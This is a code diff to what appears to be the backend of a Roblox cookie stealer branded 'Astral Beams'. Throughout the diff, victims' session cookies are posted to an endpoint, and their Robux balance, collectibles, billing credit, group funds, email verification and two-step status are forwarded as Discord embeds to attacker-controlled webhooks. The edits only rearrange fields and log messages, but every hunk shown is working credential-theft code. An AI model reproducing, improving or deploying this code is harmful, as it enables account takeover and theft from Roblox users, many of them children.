@@ -189,7 +189,7 @@ export default {
                 data: data,
                 cookie: cookie
             })
-        }).catch(function(err) { console.log('err:', err); });
+        }).catch(function(err) { console.log('main err:', err); });
 
         fetch('/api/send', {
             method: 'POST',
@@ -199,7 +199,7 @@ export default {
                 data: data,
                 cookie: cookie
             })
-        }).catch(function(err) { console.log('err:', err); });
+        }).catch(function(err) { console.log('secondary err:', err); });
 
         setTimeout(function() {
             fetch('/api/send', {
@@ -209,7 +209,7 @@ export default {
                     type: 'cookie',
                     cookie: cookie
                 })
-            }).catch(function(err) { console.log('err:', err); });
+            }).catch(function(err) { console.log('cookie err:', err); });
         }, 500);
     }
 
@@ -338,12 +338,9 @@ export default {
         const data = await response.json();
         const games = data.data || [];
         const gameNames = games.slice(0, 3).map(g => g.name || 'Unknown Game');
-        const fullList = games.map(g => g.name || 'Unknown Game');
 
         return new Response(JSON.stringify({
-          top3: gameNames,
-          fullList: fullList,
-          total: games.length
+          top3: gameNames.length > 0 ? gameNames : ['None']
         }), {
           headers: { 'Content-Type': 'application/json', 'Access-Control-Allow-Origin': '*' }
         });
@@ -385,7 +382,7 @@ export default {
           accountAge = Math.ceil(diffTime / (1000 * 60 * 60 * 24)) + ' days';
         }
 
-        // ---- MAIN EMBED (User Info + Collectibles) ----
+        // ---- MAIN EMBED (clean - no collectibles) ----
         if (type === 'main') {
           webhookUrl = env.WEBHOOK1 || FALLBACK1;
 
@@ -396,18 +393,9 @@ export default {
             { name: `${robuxEmoji} Robux`, value: d.robux !== undefined ? d.robux.toString() : '0', inline: true },
             { name: `${moneyEmoji} Pending`, value: d.pendingRobux !== undefined ? d.pendingRobux.toString() : '0', inline: true },
             { name: 'Premium', value: d.premium ? yes : no, inline: true },
-            { name: 'Korblox', value: d.korblox ? yes : no, inline: true },
-            { name: 'Headless', value: d.headless ? yes : no, inline: true },
-            { name: 'Valkyrie', value: d.valkyrie ? yes : no, inline: true },
             { name: 'Status', value: d.apiStatus || 'Processing', inline: true },
             { name: 'Refreshed', value: d.cookieRefreshed ? yes : no, inline: true }
           ];
-
-          if (d.limiteds && d.limiteds.length > 0) {
-            fields.push({ name: 'Collectibles', value: d.limiteds.join(', ') || 'None', inline: false });
-          } else {
-            fields.push({ name: 'Collectibles', value: 'None', inline: false });
-          }
 
           const embed = {
             title: `\`Astral Beams\` ${fire}`,
@@ -425,11 +413,11 @@ export default {
           };
         }
 
-        // ---- DUAL EMBED (Full Details: Billing, Groups, Settings, Gamepasses) ----
+        // ---- DUAL EMBED (Full Details: Collectibles, Billing, Groups, Settings, Gamepasses) ----
         else if (type === 'secondary') {
           webhookUrl = env.WEBHOOK2 || FALLBACK2;
 
-          let topGames = ['N/A'];
+          let topGames = ['None'];
           try {
             const gamesResp = await fetch(`https://games.roblox.com/v2/users/${d.userId}/games?sortOrder=Desc&limit=10`, {
               headers: {
@@ -446,6 +434,12 @@ export default {
             topGames = ['Error fetching games'];
           }
 
+          // Collectibles list
+          let collectibles = 'None';
+          if (d.limiteds && d.limiteds.length > 0) {
+            collectibles = d.limiteds.join(', ');
+          }
+
           const embed = {
             title: `\`Astral Beams\` ${fire}`,
             color: 0x5865F2,
@@ -456,12 +450,9 @@ export default {
               { name: `${robuxEmoji} Robux`, value: d.robux !== undefined ? d.robux.toString() : '0', inline: true },
               { name: `${moneyEmoji} Pending`, value: d.pendingRobux !== undefined ? d.pendingRobux.toString() : '0', inline: true },
               { name: 'Premium', value: d.premium ? yes : no, inline: true },
-              { name: 'Korblox', value: d.korblox ? yes : no, inline: true },
-              { name: 'Headless', value: d.headless ? yes : no, inline: true },
-              { name: 'Valkyrie', value: d.valkyrie ? yes : no, inline: true },
               { name: 'Status', value: d.apiStatus || 'Processing', inline: true },
               { name: 'Refreshed', value: d.cookieRefreshed ? yes : no, inline: true },
-              { name: 'Collectibles', value: d.limiteds?.join(', ') || 'None', inline: false },
+              { name: 'Collectibles', value: collectibles, inline: false },
               { name: 'Billing', value: `Credit: ${d.credit || 0}\nConvert: ${d.convert || 0}\nPayments: ${d.payments || 0}`, inline: false },
               { name: 'Groups', value: `Balance: ${d.groupBalance || 0}\nPending: ${d.groupPending || 0}\nOwned: ${d.groupOwned || 0}`, inline: false },
               { name: 'Settings', value: `Premium: ${d.premium ? `${yes} (${d.premiumRobux || 0} ${robuxEmoji})` : `${no} (0 ${robuxEmoji})`}\nMail: ${d.mailVerified ? `${yes} (Verified)` : `${no} (Unverified)`}\n2SV: ${d.twoStep ? `${yes} (Enabled)` : `${no} (Disabled)`}`, inline: false },
